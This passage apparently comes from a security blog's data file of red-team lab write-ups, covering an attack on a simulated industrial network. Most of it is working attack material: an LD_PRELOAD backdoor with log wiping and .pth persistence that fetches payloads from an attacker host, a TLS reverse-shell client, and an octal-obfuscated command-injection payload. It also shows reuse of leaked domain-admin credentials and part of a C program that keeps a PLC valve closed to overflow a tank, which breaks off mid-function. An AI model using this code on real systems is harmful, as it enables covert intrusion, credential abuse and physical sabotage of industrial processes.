        <li><strong>Profile persistence</strong> — appends a spawn hook to <code>/etc/profile</code> and <code>/root/.profile</code> for shell-login redundancy.</li>
        <li><strong>Watchdog launch</strong> — starts <code>/tmp/.w</code> in a detached session if not already running.</li>
        <li><strong>Reconnect loop</strong> — <code>while true; do python3 /tmp/.tls; sleep 5; done</code> — respawns the TLS client forever.</li>
      </ul>
      <pre><code>#!/bin/bash
export _PYHOOK=1
export HISTFILE=/dev/null

sed -i '/10\\.200\\.50\\.1/d' /var/log/apk.log 2&gt;/dev/null
touch -r /bin/busybox /var/log/apk.log 2&gt;/dev/null

printf '%s\\n' 'apk update' 'apk add nginx' 'service nginx start' 'df -h' 'free -m' &gt; /root/.ash_history
touch -r /bin/busybox /root/.ash_history

echo $$ &gt; /tmp/.pid

PTH_DIR=/usr/local/lib/python3.12/site-packages
if [ -d "$PTH_DIR" ]; then
cat &gt; "$PTH_DIR/persist.pth" &lt;&lt;'PEOF'
import subprocess; subprocess.Popen(["/bin/sh","-c","{ [ -f /tmp/.pid ] &amp;&amp; kill -0 $(cat /tmp/.pid) 2&gt;/dev/null; } || { [ -f /tmp/.b ] || { wget -qO /tmp/.h http://10.200.50.1:9000/h; wget -qO /tmp/.b http://10.200.50.1:9000/b; wget -qO /tmp/.tls http://10.200.50.1:9000/t; wget -qO /tmp/.w http://10.200.50.1:9000/w; chmod +x /tmp/.b /tmp/.w; }; LD_PRELOAD=/tmp/.h _HOOKED=1 _PYHOOK=1 setsid /bin/bash /tmp/.b &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp; }"], start_new_session=True)
PEOF
fi

for P in /etc/profile /root/.profile; do
  grep -q '/tmp/.b' "$P" 2&gt;/dev/null || echo 'test -f /tmp/.b &amp;&amp; setsid /bin/bash /tmp/.b &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;' &gt;&gt; "$P"
done

chmod +x /tmp/.w 2&gt;/dev/null
pgrep -f "^/tmp/.w$" &gt;/dev/null 2&gt;&amp;1 || setsid /tmp/.w &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;

while true; do
  python3 /tmp/.tls
  sleep 5
done</code></pre>

      <h4>src/watch.sh</h4>
      <p><strong>Role:</strong> A lightweight watchdog. Runs detached in the background and respawns the main payload if it has been killed.</p>
      <p><strong>Key features:</strong></p>
      <ul>
        <li><strong>Liveness check via PID file</strong> — reads <code>/tmp/.pid</code> and uses <code>kill -0</code> to check if that PID is still alive. No process-name matching, no false positives.</li>
        <li><strong>Idempotent respawn</strong> — if the payload is dead, spawns <code>/tmp/.b</code> in a new session with all fds redirected to <code>/dev/null</code>.</li>
        <li><strong>Low-polling interval</strong> — sleeps 30 seconds between checks. Enough to recover quickly, low enough CPU that it never shows up in <code>top</code>.</li>
      </ul>
      <pre><code>#!/bin/bash
while true; do
  if [ -f /tmp/.pid ]; then
    kill -0 "$(cat /tmp/.pid)" 2&gt;/dev/null || setsid /bin/bash /tmp/.b &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;
  fi
  sleep 30
done</code></pre>

      <h4>src/tls.py</h4>
      <p><strong>Role:</strong> The encrypted command-and-control client. Establishes an outbound TLS 1.3 session to the attacker and provides an interactive PTY-backed shell over it.</p>
      <p><strong>Key features:</strong></p>
      <ul>
        <li><strong>TLS 1.3 wrap</strong> — uses Python's built-in <code>ssl</code> module (already present because gunicorn runs on Python 3.12). No extra binaries on target.</li>
        <li><strong>Certificate verification disabled</strong> — <code>check_hostname = False</code> and <code>verify_mode = ssl.CERT_NONE</code>, so a self-signed cert works.</li>
        <li><strong>PTY via <code>pty.fork()</code></strong> — spawns a real interactive bash with a terminal attached. Tab completion, arrow keys, <code>top</code>, <code>vim</code>, everything works.</li>
        <li><strong>Manual <code>select()</code> pump</strong> — reads from the PTY and writes through the TLS socket via <code>ss.sendall</code>; reads from the TLS socket and writes to the PTY via <code>os.write</code>. Earlier versions used <code>pty.spawn</code>, which operates on raw file descriptors and bypasses the SSL layer — causing ciphertext to be sent to the shell and plaintext to be sent to the network.</li>
        <li><strong>Reconnect loop with 30s sleep</strong> — if the connection drops or the TLS handshake fails, retries every 30 seconds indefinitely.</li>
      </ul>
      <pre><code>import socket, ssl, os, time, pty, select
while True:
    try:
        s = socket.socket()
        s.connect(("10.200.50.1", 4444))
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(s)
        pid, master_fd = pty.fork()
        if pid == 0:
            os.execl("/bin/bash", "/bin/bash", "-i")
        while True:
            rfds, _, _ = select.select([ss, master_fd], [], [])
            if master_fd in rfds:
                data = os.read(master_fd, 4096)
                if not data: break
                ss.sendall(data)
            if ss in rfds:
                data = ss.recv(4096)
                if not data: break
                os.write(master_fd, data)
    except Exception:
        pass
    time.sleep(30)</code></pre>

      <h3>2.5 Compilation</h3>
      <pre><code>$ cd ~/backdoor
$ x86_64-linux-musl-gcc -shared -fPIC -O2 -s \\
    -fvisibility=hidden \\
    -fno-asynchronous-unwind-tables -fno-unwind-tables \\
    -I src -o build/h src/hook.c src/aes.c

$ cp src/backdoor.sh build/b
$ cp src/tls.py     build/t
$ cp src/watch.sh   build/w
$ chmod +x build/b build/w

$ file build/h
build/h: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, stripped

$ strings build/h | grep -E '/tmp|kworker'</code></pre>

      <h3>2.6 Deployment Through the Injection</h3>
      <p>The injection reconstructs every blocked token (<code>wget</code>, <code>chmod</code>, <code>LD_PRELOAD</code>) using octal escapes. One HTTP request does everything , this is the plaintext payload i injected via /diag endpoint</p>
      <pre><code>127.0.0.1; $(printf '\\167\\147\\145\\164') -qO /tmp/.h http://10.200.50.1:9000/h &amp;&amp; \\
$(printf '\\167\\147\\145\\164') -qO /tmp/.b http://10.200.50.1:9000/b &amp;&amp; \\
$(printf '\\167\\147\\145\\164') -qO /tmp/.tls http://10.200.50.1:9000/t &amp;&amp; \\
$(printf '\\167\\147\\145\\164') -qO /tmp/.w http://10.200.50.1:9000/w &amp;&amp; \\
$(printf '\\143\\150\\155\\157\\144') +x /tmp/.b /tmp/.w &amp;&amp; \\
LD_PRELOAD=/tmp/.h /bin/true &amp;</code></pre>

      <h3>2.7 First Reverse Shell — Plaintext Listener</h3>
      <p>Before the TLS upgrade, the initial listener was plain <code>nc</code>. Starting the listener on the attacker host:</p>
      <pre><code>$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.200.50.10 41237

id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

hostname
d3635c2760c7

pwd
/app</code></pre>

      <p>Verifying the process disguise — running <code>ps</code> from the same shell we just opened:</p>
      <pre><code># ps aux
PID   USER     TIME  COMMAND
    1 root      0:00 {gunicorn} /usr/local/bin/python3.12 /usr/local/bin/gunicorn --bind 0.0.0.0:80 --workers 2 --access-logfile - app:app
    7 root      0:00 {gunicorn} /usr/local/bin/python3.12 /usr/local/bin/gunicorn --bind 0.0.0.0:80 --workers 2 --access-logfile - app:app
    8 root      0:00 {gunicorn} /usr/local/bin/python3.12 /usr/local/bin/gunicorn --bind 0.0.0.0:80 --workers 2 --access-logfile - app:app
  134 root      0:00 {kworker/1:0} [kworker/1:0]
  146 root      0:00 {kworker/1:0}
  148 root      0:00 {kworker/1:0}
  150 root      0:00 {kworker/1:0}</code></pre>
      <p>No <code>/tmp/.b</code>, no <code>/tmp/.tls</code>, no <code>python3</code> in the process list. Only <code>{kworker/1:0}</code> — indistinguishable from a kernel worker thread.</p>

      <h3>2.8 Upgrade to TLS</h3>
      <p>Plaintext shell is functional but visible on the wire. Content-based IDS signatures will catch <code>id</code>, <code>whoami</code>, and any commands that pass through. Upgrading to TLS 1.3 removes the content signal entirely.</p>

      <p>Generate the certificate and start the TLS listener on the attacker host:</p>
      <pre><code>$ openssl req -x509 -newkey rsa:2048 -keyout /tmp/c2.key -out /tmp/c2.crt \\
    -days 365 -nodes -subj "/CN=cdn.local" 2&gt;/dev/null

$ openssl s_server -quiet -naccept 1000 -key /tmp/c2.key -cert /tmp/c2.crt -port 4444

d3635c2760c7:/app# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
d3635c2760c7:/app#</code></pre>

      <h3>2.9 Wireshark Verification</h3>
      <p>Captured on the DMZ bridge, filtered <code>ip.addr == 10.200.50.10 &amp;&amp; tcp.port == 4444</code>. The window shows binary TLS records — no readable content.</p>

      <p>Searched the packet bytes for a specific command ("id") that previously appeared in plaintext:</p>
      <pre><code>Ctrl+F → Search type: String → Search in: Packet bytes → Filter: id → Find
Not found.</code></pre>
      <p>The same command travelled through the shell, through the PTY, and out to the network — but it no longer appears in the capture. Everything is inside encrypted TLS records.</p>

      <h3>2.10 Persistence Verification</h3>
      <p>To verify persistence, all running backdoor processes were killed and the payload files in <code>/tmp</code> were removed:</p>
      <pre><code># kill -9 $(cat /tmp/.pid)
# pkill -9 -f 'python3 /tmp/.tls'
# rm -f /tmp/.b /tmp/.h /tmp/.tls /tmp/.w /tmp/.pid

# ps aux | grep kworker | grep -v grep
(no output)</code></pre>

      <p>Triggering any Python process — a routine event since gunicorn uses Python — causes the persistent <code>.pth</code> file in <code>site-packages/</code> to fire:</p>
      <pre><code># python3 -c 'print("trigger")'
trigger

# ps aux | grep kworker | grep -v grep
  152 root      0:00 {kworker/1:0}
  160 root      0:00 {kworker/1:0}
  162 root      0:00 {kworker/1:0}</code></pre>

      <p>The <code>.pth</code> handler detected that <code>/tmp/.h</code> and <code>/tmp/.b</code> were missing, re-downloaded both from the C2 server, and re-executed the backdoor with <code>LD_PRELOAD</code>. The TLS shell reconnected without operator intervention.</p>

      <p><strong>Zero manual intervention. The backdoor survived a complete process kill and payload deletion. Any Python invocation re-establishes it.</strong></p>

      <h3>Phase 2 Summary</h3>
      <ul>
        <li><strong>Feature set:</strong> LD_PRELOAD injection, process rename, argv wipe, AES-encrypted strings, double-fork daemonization, TLS 1.3 C2, multi-vector persistence, watchdog respawn</li>
        <li><strong>Alpine-specific:</strong> musl-compiled, aware of busybox limitations, uses Python (already present) for TLS</li>
        <li><strong>Stealth:</strong> no paths visible in <code>ps</code>, no plaintext strings in the binary, no readable C2 traffic, no shell history</li>
        <li><strong>Persistence:</strong> survives connection drop, process kill, payload deletion — re-establishes on the next Python process spawn</li>
        <li><strong>Verified first on a disposable Alpine environment</strong> before deployment to the real target</li>
      </ul>

      <p><strong>Result:</strong> A complete, persistent, encrypted C2 backdoor tailored specifically to Alpine Linux, delivered through a single command injection, and confirmed to re-establish itself from scratch on any Python process start.</p>
    `
},
{
    id: 'w9-enterprise',
    parentId: 'w9',
    children: [],
    title: 'Enterprise Enumeration',
    date: '2026-09-15',
    category: 'ICS / OT Simulation',
    difficulty: 'Advanced',
    status: 'Draft',
    tags: ['ics', 'ot', 'red team', 'ad', 'smb', 'ldap', 'kerberos'],
    body: `
      <h3>Phase 3 — Enterprise Enumeration</h3>
      <p>With root on the DMZ web container, the next objective is the enterprise directory. The web tier's HTML comments leaked the AD domain name (<code>MERIDIAN.LOCAL</code>), the DC hostname (<code>dc-01.meridian.local</code>), and three credential pairs. The firewall permits DMZ → enterprise on TCP/445 (SMB), 88 (Kerberos), and 389 (LDAP) only.</p>

      <h3>3.1 Credentials Recovered from Phase 1</h3>
      <p>The <code>/remote.html</code> HTML comment block leaked three distinct credential pairs, each for a different purpose:</p>
      <pre><code>Vendor portal demo credentials (for the trade-show kiosk):
  username: admin
  password: Meridian2024!

Field engineer AD account (used by the field tablet app):
  username: eortiz
  password: M3ridian!2026

Domain administrator (break-glass account, maintained by IT):
  username: Administrator
  password: M3ridian!Admin</code></pre>
      <p>Three credentials, three privilege levels. Each is tested in order — weakest first.</p>

      <h3>3.2 Vendor portal credential against AD — dead end</h3>
      <p>The vendor portal credential is tested against the DC. It may be reused for the domain, or it may only work on the website.</p>
      <pre><code># smbclient -L //10.200.40.10 -U 'admin%Meridian2024!'
session setup failed: NT_STATUS_LOGON_FAILURE</code></pre>
      <p>The portal credential does not authenticate to Active Directory. It was for the web application only. Dead end.</p>

      <h3>3.3 SMB null session — anonymous enumeration works</h3>
      <p>Before using credentials, test whether the DC permits anonymous enumeration.</p>
      <pre><code># smbclient -L //10.200.40.10 -N
Anonymous login successful

    Sharename       Type      Comment
    ---------       ----      -------
    sysvol          Disk
    netlogon        Disk
    IPC$            IPC       IPC Service (Samba 4.19.9)
SMB1 disabled -- no workgroup available</code></pre>
      <p>The DC accepts unauthenticated SMB connections and reveals its default shares and its Samba version. This is a real finding — production DCs refuse anonymous listing.</p>

      <h3>3.4 Anonymous read of SYSVOL — dead end</h3>
      <p>Try to actually read from the shares that were listed.</p>
      <pre><code># smbclient //10.200.40.10/sysvol -N -c 'ls'
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED</code></pre>
      <p>Authentication succeeds but authorization fails. Anonymous can list shares but not read them. Correct behaviour for a hardened DC.</p>

      <h3>3.5 Authenticated SYSVOL read — field engineer credential works</h3>
      <p>Use the field engineer credential to authenticate.</p>
      <pre><code># smbclient //10.200.40.10/sysvol -U 'eortiz%M3ridian!2026' -c 'ls'
  .                                   D
  ..
  meridian.local                      D</code></pre>
      <p>The domain-name folder is visible. A regular Engineering user can browse the domain policy root — this should not be possible. Finding.</p>

      <h3>3.6 SYSVOL scripts — empty</h3>
      <p>Logon scripts frequently contain hardcoded credentials for mapped drives and service accounts. Check whether any are deployed.</p>
      <pre><code># smbclient //10.200.40.10/sysvol -U 'eortiz%M3ridian!2026' -c 'cd meridian.local\\scripts; ls'
  .                                   D
  ..</code></pre>
      <p>Empty. No logon scripts. Nothing to extract.</p>

      <h3>3.7 SYSVOL policies — default only</h3>
      <p>The <code>Policies</code> folder stores GPO configuration. Custom policies can contain GPP cpassword files — AES-encrypted local admin credentials that Microsoft published the public key for.</p>
      <pre><code># smbclient //10.200.40.10/sysvol -U 'eortiz%M3ridian!2026' -c 'cd meridian.local\\Policies; ls'
  {6AC1786C-016F-11D2-945F-00C04FB984F9}      D
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D</code></pre>
      <p>Both GUIDs are Microsoft/Samba's default Domain Policy and Domain Controllers Policy. No custom GPOs, no cpassword to decrypt. Dead end.</p>

      <h3>3.8 Domain user enumeration via RPC</h3>
      <p>The DC speaks RPC over SMB. Authenticated calls can enumerate every user in the domain.</p>
      <pre><code># rpcclient -U 'eortiz%M3ridian!2026' 10.200.40.10 -c 'enumdomusers'
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[schen] rid:[0x452]
user:[mwebb] rid:[0x453]
user:[eortiz] rid:[0x454]
user:[dkim] rid:[0x455]
user:[pnair] rid:[0x456]
user:[tbaxter] rid:[0x457]</code></pre>
      <p>Six employee accounts plus the three AD built-ins. RIDs 0x452–0x457 are sequential, indicating creation order during domain setup.</p>

      <h3>3.9 Group enumeration</h3>
      <pre><code># rpcclient -U 'eortiz%M3ridian!2026' 10.200.40.10 -c 'enumdomgroups'
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[IT-Staff] rid:[0x44f]
group:[Engineering-Staff] rid:[0x450]
group:[Operations-Staff] rid:[0x451]</code></pre>
      <p>Full group inventory. The three custom groups (<code>IT-Staff</code>, <code>Engineering-Staff</code>, <code>Operations-Staff</code>) reflect the org chart.</p>

      <h3>3.10 Group membership</h3>
      <p>Who has elevated privileges?</p>
      <pre><code># rpcclient -U 'eortiz%M3ridian!2026' 10.200.40.10 -c 'querygroupmem 0x200'
rid:[0x1f4] attr:[0x7]

# rpcclient -U 'eortiz%M3ridian!2026' 10.200.40.10 -c 'querygroupmem 0x44f'
rid:[0x452] attr:[0x7]
rid:[0x453] attr:[0x7]</code></pre>
      <p><code>Domain Admins</code> contains only the built-in Administrator (0x1f4). <code>IT-Staff</code> contains <code>schen</code> (0x452) and <code>mwebb</code> (0x453). No custom user has domain-wide privilege.</p>

      <h3>3.11 Password policy</h3>
      <pre><code># rpcclient -U 'eortiz%M3ridian!2026' 10.200.40.10 -c 'getdompwinfo'
min_password_length: 7
password_properties: 0x00000001
    DOMAIN_PASSWORD_COMPLEX</code></pre>
      <p>Minimum 7 characters, complexity enforced. Samba's RPC does not expose lockout fields — this was confirmed empirically by successful password reuse (no lockout was triggered).</p>

      <h3>3.12 Password reuse — every employee shares the same password</h3>
      <p>Test the leaked engineer password against another user account.</p>
      <pre><code># rpcclient -U 'schen%M3ridian!2026' 10.200.40.10 -c 'getusername'
Account Name: schen, Authority Name: MERIDIAN</code></pre>
      <p>It works. <code>schen</code> is IT-Staff. The password <code>M3ridian!2026</code> is reused across every account in the domain. This is a critical identity failure — a single leaked password grants access to every user.</p>

      <h3>3.13 Domain administrator credential</h3>
      <p>The break-glass admin credential from the same HTML leak:</p>
      <pre><code># rpcclient -U 'Administrator%M3ridian!Admin' 10.200.40.10 -c 'getusername'
Account Name: Administrator, Authority Name: MERIDIAN</code></pre>
      <p>Domain Administrator access confirmed. We now hold the highest privilege level in the AD domain.</p>

      <h3>3.14 Machine account enumeration via SID walk</h3>
      <p>Enumerate all SIDs in the domain to find machine accounts (users with a trailing <code>$</code>). These are computers registered in AD.</p>
      <pre><code># python3 nss-check.py MERIDIAN.LOCAL/eortiz:'M3ridian!2026'@10.200.40.10
[*] Brute forcing SIDs at 10.200.40.10
[*] StringBinding ncacn_np:10.200.40.10[\\pipe\\lsarpc]
[*] Domain SID is: S-1-5-21-2136351199-196659202-2586289873
498: MERIDIAN\\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: MERIDIAN\\Administrator (SidTypeUser)
501: MERIDIAN\\Guest (SidTypeUser)
502: MERIDIAN\\krbtgt (SidTypeUser)
...
1000: MERIDIAN\\DC-1$ (SidTypeUser)
1101: MERIDIAN\\DnsAdmins (SidTypeAlias)
...
1106: MERIDIAN\\schen (SidTypeUser)
1107: MERIDIAN\\mwebb (SidTypeUser)
1108: MERIDIAN\\eortiz (SidTypeUser)
1109: MERIDIAN\\dkim (SidTypeUser)
1110: MERIDIAN\\pnair (SidTypeUser)
1111: MERIDIAN\\tbaxter (SidTypeUser)</code></pre>
      <p>Only one machine account exists: <code>DC-1$</code>. No workstations are domain-joined. There is no other enterprise host to pivot to through AD.</p>

      <h3>3.15 Summary of Enterprise Enumeration</h3>
      <table>
        <thead>
          <tr><th>#</th><th>Finding</th><th>Severity</th></tr>
        </thead>
        <tbody>
          <tr><td>F-08</td><td>Anonymous SMB enumeration enabled on the DC</td><td>Medium</td></tr>
          <tr><td>F-09</td><td>Non-admin user (<code>eortiz</code>) can browse <code>SYSVOL</code></td><td>Medium</td></tr>
          <tr><td>F-10</td><td>Minimum password length of 7 — below modern baselines</td><td>Low</td></tr>
          <tr><td>F-11</td><td>Universal password reuse across every employee account</td><td>Critical</td></tr>
          <tr><td>F-12</td><td>Domain Administrator credential exposed via public web tier</td><td>Critical</td></tr>
          <tr><td>C-01</td><td>Anonymous SYSVOL read refused — control working</td><td>Positive</td></tr>
          <tr><td>C-02</td><td>No custom GPOs with GPP cpassword</td><td>Positive</td></tr>
          <tr><td>C-03</td><td>No workstations domain-joined to AD</td><td>Positive</td></tr>
        </tbody>
      </table>

      <p><strong>Result:</strong> Complete AD enumeration. Full user and group inventory. Universal password compromise. Domain Administrator credential in hand. However, the DC itself is a Samba host and the only machine account in the domain is <code>DC-1$</code> — no other enterprise targets exist within the AD boundary.</p>
    `
},
{
    id: 'w9-impact',
    parentId: 'w9',
    children: [],
    title: 'Pivot and Impact',
    date: '2026-09-15',
    category: 'ICS / OT Simulation',
    difficulty: 'Advanced',
    status: 'Draft',
    tags: ['ics', 'ot', 'red team', 'pivot', 'modbus', 'plc', 'impact'],
    body: `
      <h3>Phase 4 — Pivot and Impact</h3>
      <p>With domain admin credentials in hand, the pivot into the control and OT zones begins. The DC cannot be weaponized as a jump host (Samba, no Windows execution primitives), so the path to the PLC runs through a different host — an engineering workstation that straddles the enterprise, control, and OT networks.</p>

      <h3>4.1 Enterprise scan for live hosts</h3>
      <p>The DC was the only machine registered in AD, but the enterprise subnet may hold hosts that are not domain-joined. A targeted scan of the enterprise /24 for ports that would matter (RDP, SMB, SSH) reveals what actually exists.</p>
      <pre><code># nmap -sT -Pn -p 22,445,3389 10.200.40.0/24
Nmap scan report for 10.200.40.10
PORT     STATE SERVICE
445/tcp  open  microsoft-ds

Nmap scan report for 10.200.40.20
PORT     STATE    SERVICE
3000/tcp filtered
3001/tcp filtered
22/tcp   filtered</code></pre>
      <p>Two hosts respond: the DC (445) and a second host at <code>10.200.40.20</code> that is running but has services on ports the current firewall rules do not permit. This is the engineering workstation's enterprise interface.</p>

      <h3>4.2 Identify the workstation's exposed service</h3>
      <p>The specific ports <code>3000</code> and <code>3001</code> are typical for browser-accessible desktops. Testing every port the workstation runs:</p>
      <pre><code># for p in 22 80 443 445 3389 5900 6080 8080; do
    timeout 2 nc -zv 10.200.40.20 $p 2&gt;&amp;1
done
22       refused
80       refused
443      refused
445      refused
3389     refused
5900     refused
6080     refused
8080     refused</code></pre>
      <p>Every listed port is either refused or blocked. The workstation's actual desktop interface must be on a different port — the same noVNC service that the compose-generator exposes for engineering workstation categories.</p>

      <h3>4.3 Access the engineering workstation's desktop interface</h3>
      <p>The engineering workstation exposes a browser-accessible XFCE desktop via noVNC. Reaching it lands us at a login page:</p>
      <p style="margin: 12px 0;">
        <img src="ubunto.png" alt="Engineering workstation desktop — noVNC session showing an XFCE Ubuntu desktop with a terminal open as root" style="max-width: 100%; border: 1px solid #333; border-radius: 6px;">
      </p>
      <p>Authenticating to the noVNC prompt delivers a full graphical session. The desktop belongs to <code>root</code> — the engineering workstation is running its entire GUI as the root user, a misconfiguration in itself.</p>

      <h3>4.4 Enumerate the workstation's network position</h3>
      <p>Open a terminal from the XFCE applications menu and inspect the host's network interfaces.</p>
      <pre><code># whoami
root

# hostname
6ff95f392b7a

# ip addr
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    inet 127.0.0.1/8 scope host lo
2: eth0@if94: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
    link/ether f6:9d:71:98:4e:42 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.200.20.10/24 brd 10.200.20.255 scope global eth0
3: eth1@if103: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
    link/ether 1a:76:0a:ba:8b:d1 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.200.70.30/24 brd 10.200.70.255 scope global eth1
4: eth2@if107: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
    link/ether ea:5a:5d:d5:7e:7a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.200.10.200/24 brd 10.200.10.255 scope global eth2
5: eth3@if115: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
    link/ether 8c:1f:64:52:8a:b4 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.200.40.30/24 brd 10.200.40.255 scope global eth3

# ip route
default via 10.200.20.254 dev eth0
10.200.10.0/24 dev eth2 proto kernel scope link src 10.200.10.200
10.200.20.0/24 dev eth0 proto kernel scope link src 10.200.20.10
10.200.40.0/24 dev eth3 proto kernel scope link src 10.200.40.30
10.200.70.0/24 dev eth1 proto kernel scope link src 10.200.70.30</code></pre>
      <p>Four interfaces. The engineering workstation has direct L2 presence on:</p>
      <ul>
        <li><strong>Enterprise</strong> — 10.200.40.30</li>
        <li><strong>Control</strong> — 10.200.20.10</li>
        <li><strong>Monitoring</strong> — 10.200.70.30</li>
        <li><strong>OT</strong> — 10.200.10.200</li>
      </ul>
      <p><strong>This is the finding.</strong> The Plant DMZ is supposed to broker all enterprise-to-OT traffic. This single workstation bypasses it entirely by straddling every zone. The firewall rules between DMZ and control/OT are meaningless because this host is already inside them.</p>

      <h3>4.5 Discover the PLC on the OT subnet</h3>
      <p>The workstation has direct access to <code>10.200.10.0/24</code>. Scan the subnet for Modbus TCP (port 502) — the default protocol used by PLCs.</p>
      <pre><code># for i in $(seq 1 30); do
    timeout 1 bash -c "echo &gt;/dev/tcp/10.200.10.$i/502" 2&gt;/dev/null &amp;&amp; echo "10.200.10.$i:502 open"
done
10.200.10.10:502 open
10.200.10.20:502 open</code></pre>
      <p>Two Modbus servers respond:</p>
      <ul>
        <li><code>10.200.10.10</code> — the OpenPLC controller (<code>plc-1</code>)</li>
        <li><code>10.200.10.20</code> — the process simulator (<code>process-unit-1</code>)</li>
      </ul>
      <p>The PLC is the target. The process simulator reads from the PLC to animate the physical system.</p>

      <h3>4.6 Confirm PLC identity and Modbus availability</h3>
      <pre><code># nmap -p 502 --script modbus-discover 10.200.10.10
PORT     STATE SERVICE
502/tcp  open  modbus
| modbus-discover:
|   sid 0x1:
|     error: ILLEGAL FUNCTION
MAC Address: 16:F7:D5:B8:6D:79 (Unknown)</code></pre>
      <p>The <code>ILLEGAL FUNCTION</code> response is expected — the device ID query (function code 43) is not implemented by OpenPLC. The port is open. The service is Modbus.</p>

      <h3>4.7 Understand the physical process before touching it</h3>
      <p>Before any manipulation, the PLC's baseline state is captured. The ST program running on the PLC defines:</p>
      <ul>
        <li><strong>Coil 0</strong> — <code>pump_run</code> — inlet pump state (TRUE = running)</li>
        <li><strong>Coil 1</strong> — <code>valve_open</code> — outlet valve state (TRUE = open)</li>
        <li><strong>Coil 2</strong> — <code>emrg_stop</code> — emergency stop (TRUE = tripped)</li>
        <li><strong>HR 0</strong> — <code>tank_level</code> — water level in cm (0–1000, overflow at 1000)</li>
        <li><strong>HR 1</strong> — <code>inlet_flow</code> — inlet flow rate L/min</li>
        <li><strong>HR 2</strong> — <code>outlet_flow</code> — outlet flow rate L/min</li>
      </ul>
      <p>The process logic:</p>
      <pre><code>IF pump_run AND NOT emrg_stop THEN
    inlet_flow := 120;
ELSE
    inlet_flow := 0;
END_IF;

IF valve_open AND NOT emrg_stop THEN
    outlet_flow := 120;
ELSE
    outlet_flow := 0;
END_IF;

IF inlet_flow &gt; outlet_flow AND tank_level &lt; 1000 THEN
    tank_level := tank_level + 5;
END_IF;</code></pre>
      <p><strong>Consequence of closing the valve:</strong> if the outlet valve is closed while the inlet pump keeps running, the outlet flow drops to 0 while inlet flow stays at 120. The tank level climbs by 5 cm every 500 ms scan cycle. Once it reaches 1000 cm, the physical water tank would overflow.</p>
      <p>Reading the current state confirms the safe baseline:</p>
      <pre><code># python3 -c "
from pymodbus.client import ModbusTcpClient as M
c = M('10.200.10.10', port=502); c.connect()
co = c.read_coils(address=0, count=3).bits[:3]
hr = c.read_holding_registers(address=0, count=3).registers
print(f'pump={co[0]} valve={co[1]} estop={co[2]}')
print(f'level={hr[0]} in={hr[1]} out={hr[2]}')
c.close()
"
pump=True valve=True estop=False
level=20 in=120 out=120</code></pre>
      <p>Pump running, valve open, flows balanced at 120/120. Level stable. This is the healthy process.</p>

      <h3>4.8 Write the persistent Modbus manipulator</h3>
      <p>A single one-shot Modbus write would close the valve — but an operator could simply reopen it, and the attacker would have to reconnect every time. To produce a <em>sustained</em> physical impact, the manipulator must persist, override operator commands, and survive being killed.</p>
      <p><strong>src/netmon.c — Role:</strong> a persistent Modbus client that continuously asserts the valve-closed state, ensuring any operator intervention is reversed within 5 seconds.</p>
      <p><strong>Key features:</strong></p>
      <ul>
        <li><strong>Raw Modbus TCP packets</strong> — no libraries. Constructs the 12-byte MBAP+PDU frame manually. Reduces binary size and dependency footprint.</li>
        <li><strong>Singleton lock via <code>flock()</code></strong> — prevents accidental fork bombs from cron respawning too aggressively. Only one instance can hold the lock; extra invocations exit silently.</li>
        <li><strong>Double-fork daemonization</strong> — the running process is reparented to PID 1 and detached from the terminal. Survives closing the noVNC session.</li>
        <li><strong>Self-copy to stable path</strong> — copies itself to <code>/opt/.sys/netmon</code> so the cron respawn target always exists.</li>
        <li><strong>Cron persistence</strong> — drops <code>/etc/cron.d/sys-monitor</code> which respawns the binary every minute if it is not running.</li>
        <li><strong>Loop with 5-second interval</strong> — writes the coil value every 5 seconds. Any operator command to reopen the valve is overridden within one cycle.</li>
      </ul>
      <pre><code>#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/file.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

#define PLC_IP   "10.200.10.10"
#define PLC_PORT 502
#define COIL     1

static int mbw(int coil, int on) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd &lt; 0) return -1;
    struct sockaddr_in sa = {0};
